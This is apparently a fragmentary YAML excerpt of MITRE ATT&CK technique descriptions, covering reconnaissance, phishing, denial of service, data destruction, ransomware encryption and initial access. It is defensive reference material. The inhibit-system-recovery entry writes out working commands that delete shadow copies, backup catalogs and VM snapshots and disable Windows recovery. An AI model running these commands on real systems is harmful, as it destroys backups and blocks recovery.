        Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.

        Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor’s geographical region.

        Adversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization’s website.(Citation: DigitalShadows CDN) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)).

        Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Additionally, adversaries may analyze metadata from victim-owned files (e.g., PDFs, DOCs, images, and sound files hosted on victim-owned websites) to extract information about the software and hardware used to create or process those files. Metadata may reveal software versions, configurations, or timestamps that indicate outdated or vulnerable software. This information can be cross-referenced with known CVEs to identify potential vectors for exploitation in future operations.(Citation: Outpost24)

        and crawling techniques. While this technique employs similar methods to [Brute
        Force](https://attack.mitre.org/techniques/T1110), its goal is the identification
        of content and infrastructure rather than the discovery of valid credentials.
        Wordlists used in these scans may contain generic, commonly used names and
        file extensions or terms specific to a particular software. Adversaries may
        also create custom, target-specific wordlists using data gathered from other
        Reconnaissance techniques (ex: [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591),
        or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).\n\nFor
        example, adversaries may use web content discovery tools such as Dirb, DirBuster,
        and GoBuster and generic or custom wordlists to enumerate a website’s pages
        and directories.(Citation: ClearSky Lebanese Cedar Jan 2021) This can help
        them to discover old, vulnerable pages or hidden administrative portals that
        could become the target of further operations (ex: [Exploit Public-Facing
        Application](https://attack.mitre.org/techniques/T1190) or [Brute Force](https://attack.mitre.org/techniques/T1110)).
        \ \n\nAs cloud storage solutions typically use globally unique names, adversaries
        may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute
        to enumerate public and private buckets on cloud infrastructure.(Citation:
        S3Recon GitHub)(Citation: GCPBucketBrute) Once storage objects are discovered,
        adversaries may leverage [Data from Cloud Storage](https://attack.mitre.org/techniques/T1530)
        to access valuable information that can be exfiltrated or used to escalate
        privileges and move laterally. "

      name: Phishing for Information
      description: "Adversaries may send phishing messages to elicit sensitive information
        that can be used during targeting. Phishing for information is an attempt
        to trick targets into divulging information, frequently credentials or other
        actionable information. Phishing for information is different from [Phishing](https://attack.mitre.org/techniques/T1566)
        in that the objective is gathering data from the victim rather than executing
        malicious code.\n\nAll forms of phishing are electronically delivered social
        engineering. Phishing can be targeted, known as spearphishing. In spearphishing,
        a specific individual, company, or industry will be targeted by the adversary.
        More generally, adversaries can conduct non-targeted phishing, such as in
        mass credential harvesting campaigns.\n\nAdversaries may also try to obtain
        information directly through the exchange of emails, instant messages, or
        other electronic conversation means.(Citation: ThreatPost Social Media Phishing)(Citation:
        TrendMictro Phishing)(Citation: PCMag FakeLogin)(Citation: Sophos Attachment)(Citation:
        GitHub Phishery) Victims may also receive phishing messages that direct them
        to call a phone number where the adversary attempts to collect confidential
        information.(Citation: Avertium callback phishing)\n\nPhishing for information
        frequently involves social engineering techniques, such as posing as a source
        with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)
        or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or
        sending multiple, seemingly urgent messages. Another way to accomplish this
        is by [Email Spoofing](https://attack.mitre.org/techniques/T1672)(Citation:
        Proofpoint-spoof) the identity of the sender, which can be used to fool both
        the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce)
        \n\nPhishing for information may also involve evasive techniques, such as
        removing or manipulating emails or metadata/headers from compromised accounts
        being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation:

      description: |-
        Adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.

        All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: ThreatPost Social Media Phishing) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.

      description: |-
        Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.

        Botnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)

      name: OS Exhaustion Flood
      description: |-
        Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.

        Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)

        ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)

      description: |-
        Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.

        To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)

        On network devices, adversaries may wipe configuration files and other data from the device using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `erase`.(Citation: erase_cmd_cisco)

      name: Reflection Amplification
      description: |-
        Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target.(Citation: Cloudflare ReflectionDoS May 2017) This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.

        Reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS(Citation: Cloudflare DNSamplficationDoS) and NTP(Citation: Cloudflare NTPamplifciationDoS), though the use of several others in the wild have been documented.(Citation: Arbor AnnualDoSreport Jan 2018)  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.(Citation: Cloudflare Memcrashed Feb 2018)

      name: Service Exhaustion Flood
      description: |-
        Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.

        One example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.(Citation: Cloudflare HTTPflood)

        Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.(Citation: Arbor SSLDoS April 2012)

      description: |-
        Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: Sygnia Elephant Beetle Jan 2022) By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.

        The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.

      description: "Adversaries may encrypt data on target systems or on large numbers
        of systems in a network to interrupt availability to system and network resources.
        They can attempt to render stored data inaccessible by encrypting files or
        data on local and remote drives and withholding access to a decryption key.
        This may be done in order to extract monetary compensation from a victim in
        exchange for decryption or a decryption key (ransomware) or to render data
        permanently inaccessible in cases where the key is not saved or transmitted.(Citation:
        US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT
        NotPetya 2017)(Citation: US-CERT SamSam 2018)\n\nIn the case of ransomware,
        it is typical that common user files like Office documents, PDFs, images,
        videos, audio, text, and source code files will be encrypted (and often renamed
        and/or tagged with specific file markers). Adversaries may need to first employ
        other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222)
        or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in
        order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack
        Conti July 2020) In some cases, adversaries may encrypt critical system files,
        disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) Adversaries
        may also encrypt virtual machines hosted on ESXi or other hypervisors.(Citation:
        Crowdstrike Hypervisor Jackpotting Pt 2 2021) \n\nTo maximize impact on the
        target organization, malware designed for encrypting data may have worm-like
        features to propagate across a network by leveraging other attack techniques
        like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential
        Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin
        Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye
        WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also
        leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001),
        such as changing victim wallpapers or ESXi server login messages, or otherwise
        intimidate victims by sending ransom notes or other messages to connected
        printers (known as \"print bombing\").(Citation: NHS Digital Egregor Nov 2020)(Citation:

        may also be encrypted.(Citation: Rhino S3 Ransomware Part 1) For example,
        in AWS environments, adversaries may leverage services such as AWS’s Server-Side
        Encryption with Customer Provided Keys (SSE-C) to encrypt data.(Citation:

        Adversaries may flood targeted email addresses with an overwhelming volume of messages. This may bury legitimate emails in a flood of spam and disrupt business operations.(Citation: sophos-bombing)(Citation: krebs-email-bombing)

        An adversary may accomplish email bombing by leveraging an automated bot to register a targeted address for e-mail lists that do not validate new signups, such as online newsletters. The result can be a wave of thousands of e-mails that effectively overloads the victim’s inbox.(Citation: krebs-email-bombing)(Citation: hhs-email-bombing)

        By sending hundreds or thousands of e-mails in quick succession, adversaries may successfully divert attention away from and bury legitimate messages including security alerts, daily business processes like help desk tickets and client correspondence, or ongoing scams.(Citation: hhs-email-bombing) This behavior can also be used as a tool of harassment.(Citation: krebs-email-bombing)

        This behavior may be a precursor for [Spearphishing Voice](https://attack.mitre.org/techniques/T1566/004). For example, an adversary may email bomb a target and then follow up with a phone call to fraudulently offer assistance.

      name: Endpoint Denial of Service
      description: |
        Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)

        An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).

        To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.

        Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.

        Botnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)

        In cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)

        For attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).

        mine cryptocurrency\n* Sell network bandwidth to proxy networks\n* Generate
        SMS traffic for profit\n* Abuse cloud-based messaging services to send large

      description: |-
        Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.

        Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.

      description: |-
        Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.

        Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)

        To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018).

        In cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers.(Citation: Data Destruction - Threat Post)(Citation: DOJ  - Cisco Insider) Similarly, they may delete virtual machines from on-prem virtualized environments.

      name: Network Denial of Service
      description: |-
        Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)

        A Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).

        To perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.

        Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.

        For DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).

        Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options.

        Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Furthermore, adversaries may disable recovery notifications, then corrupt backups.(Citation: disable_notif_synology_ransom)

        A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:

        * <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>
        * [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>
        * <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>
        * <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>
        * <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system
        * <code>diskshadow.exe</code> can be used to delete all volume shadow copies on a system - <code>diskshadow delete shadows all</code> (Citation: Diskshadow) (Citation: Crytox Ransomware)

        On network devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561) to delete backup firmware images and reformat the file system, then [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.

        On ESXi servers, adversaries may delete or encrypt snapshots of virtual machines to support [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486), preventing them from being leveraged as backups (e.g., via ` vim-cmd vmsvc/snapshot.removeall`).(Citation: Cybereason)

        Adversaries may also delete “online” backups that are connected to their network – whether via network storage media or through folders that sync to cloud services.(Citation: ZDNet Ransomware Backups 2020) In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, database backups, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.(Citation: Dark Reading Code Spaces Cyber Attack)(Citation: Rhino Security Labs AWS S3 Ransomware)

      description: |-
        Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.

        Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have also been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk are erased instead of individual files.

        To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)

        Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)

        Access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.

        Access may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)

        Adversaries may also establish persistence on network by configuring a Tor hidden service on a compromised system. Adversaries may utilize the tool `ShadowLink` to facilitate the installation and configuration of the Tor hidden service. Tor hidden service is then accessible via the Tor network because `ShadowLink` sets up a .onion address on the compromised system. `ShadowLink` may be used to forward any inbound connections to RDP, allowing the adversaries to have remote access.(Citation: The BadPilot campaign) Adversaries may get `ShadowLink` to persist on a system by masquerading it as an MS Defender application.(Citation: Russian threat actors dig in, prepare to seize on war fatigue)

      name: 'Phishing: Spearphishing Link'
      description: |-
        Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

        All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.

        Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an "IDN homograph attack").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)

        Adversaries may also utilize links to perform consent phishing/spearphishing campaigns to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s that grant immediate access to the victim environment. For example, a user may be lured into granting adversaries permissions/access via a malicious OAuth 2.0 request URL that when accepted by the user provide permissions/access for malicious applications.(Citation: Trend Micro Pawn Storm OAuth 2017)(Citation: Microsoft OAuth 2.0 Consent Phishing 2021) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls.(Citation: Microsoft OAuth 2.0 Consent Phishing 2021)

        Similarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as “device code phishing,” an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.(Citation: SecureWorks Device Code Phishing 2021)(Citation: Netskope Device Code Phishing 2021)(Citation: Optiv Device Code Phishing 2021)

      name: 'Phishing: Spearphishing Attachment'
      description: "Adversaries may send spearphishing emails with a malicious attachment
        in an attempt to gain access to victim systems. Spearphishing attachment is
        a specific variant of spearphishing. Spearphishing attachment is different
        from other forms of spearphishing in that it employs the use of malware attached
        to an email. All forms of spearphishing are electronically delivered social
        engineering targeted at a specific individual, company, or industry. In this
        scenario, adversaries attach a file to the spearphishing email and usually
        rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain
        execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also
        involve social engineering techniques, such as posing as a trusted source.\n\nThere
        are many options for the attachment such as Microsoft Office documents, executables,
        PDFs, or archived files. Upon opening the attachment (and potentially clicking
        past protections), the adversary's payload exploits a vulnerability or directly
        executes on the user's system. The text of the spearphishing email usually
        tries to give a plausible reason why the file should be opened, and may explain
        how to bypass system protections in order to do so. The email may also contain
        instructions on how to decrypt an attachment, such as a zip file password,
        in order to evade email boundary defenses. Adversaries frequently manipulate
        file extensions and icons in order to make attached executables appear to
        be document files, or files exploiting one application appear to be a file
        for a different one. "

      name: Replication Through Removable Media
      description: |-
        Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.

        Mobile devices may also be used to infect PCs with malware if connected via USB.(Citation: Exploiting Smartphone USB ) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.(Citation: Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).

      description: |-
        Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.

        Exploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) On ESXi infrastructure, adversaries may exploit exposed OpenSLP services; they may alternatively exploit exposed VMware vCenter servers.(Citation: Recorded Future ESXiArgs Ransomware 2023)(Citation: Ars Technica VMWare Code Execution Vulnerability 2021) Depending on the flaw being exploited, this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).

